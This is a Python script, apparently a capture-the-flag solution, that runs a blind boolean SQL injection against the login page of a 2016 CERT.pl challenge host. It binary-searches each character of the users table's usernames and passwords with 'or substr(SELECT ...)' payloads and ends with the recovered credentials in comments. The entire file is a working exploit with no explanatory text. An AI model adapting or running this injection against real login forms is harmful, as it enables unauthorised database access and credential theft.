import requests, urllib, re, sys, base64

url_login = "https://secretpanel.ecsm2016.cert.pl/login"
url_logout = "https://secretpanel.ecsm2016.cert.pl/logout"

url_payload = url_login	


sessid = requests.Session()

init_array = []
sillent = False
fancy_console = False

ASCIIAlphabet = "\001 !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
simpleAlphabet = "\001abcdefghijklmnopqrstuvwxyz"
HEXAlphabet = "\0010123456789abcdef"
advancedAlphabet= "\0010123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"


users_payload = "'or substr( (SELECT username FROM users LIMIT @rOFFSET@, 1) ,@wOFFSET@,1 )>'@cORD@"
passwords_payload = "'or substr( (SELECT password FROM users LIMIT @rOFFSET@, 1) ,@wOFFSET@,1 )>'@cORD@"

def printInPlace(alert):
	if fancy_console:
		sys.stdout.write("{}{}".format(alert, "\b"*len(alert)))
		sys.stdout.flush();
	return fancy_console

def createPayload( query ):
	return {"password": query, "username": "admin" }

def sendPayload ( query ):
	if sillent == False: print ("exec: {}".format(query))
	payload = createPayload(query)
	add = sessid.post(url_payload, payload, allow_redirects=True)
	return testify(add.text)

def logIn():
	print ("loggin in: ")
	sessid.get(url_login, allow_redirects=True)
	return

def logOut():
	sessid.get(url_logout)
	return

def testify(text):
	return text

def tryPayload(str):
	test = sendPayload(str)
	return "Logged in successfully" in test

#bin-search ASCII inside [alphabet]
def findName(payload, alphabet):
	a = 0
	b = len(alphabet)-1
	while (a < b):
		mid = (a+b)//2
		c = alphabet[mid]
		printInPlace(c)
		if tryPayload( payload.replace("@cORD@", c ) ): 
			a = mid + 1
			logOut()
		else:
			b = mid
	return alphabet[a]


def findNames(payload, alphabet):
	for result_offset in range(0, 10):
		result = ""
		pl = payload.replace("@rOFFSET@", str(result_offset))
		for word_offset in range(1, 40):
			pl2 = pl.replace("@wOFFSET@", str(word_offset))
			c = findName(pl2, alphabet)
			if c == alphabet[0]: break
			sys.stdout.write(c)
			sys.stdout.flush
			result+=c
		print(" ")
		if len(result) <= 1: break
	return


def findUsers():
	print ("..:: Searching for users ::..")
	findNames(users_payload, ASCIIAlphabet)

def findPasswords():
	print ("..:: Searching for passwords ::..")
	findNames(passwords_payload, ASCIIAlphabet)



fancy_console = True # Turn on fancy terminal output
sillent = True # Turn off debugging mode
logIn();


findUsers();
findPasswords();


# admin:VZnG9VX48M
# hacker:MakeCyberGreatAgain

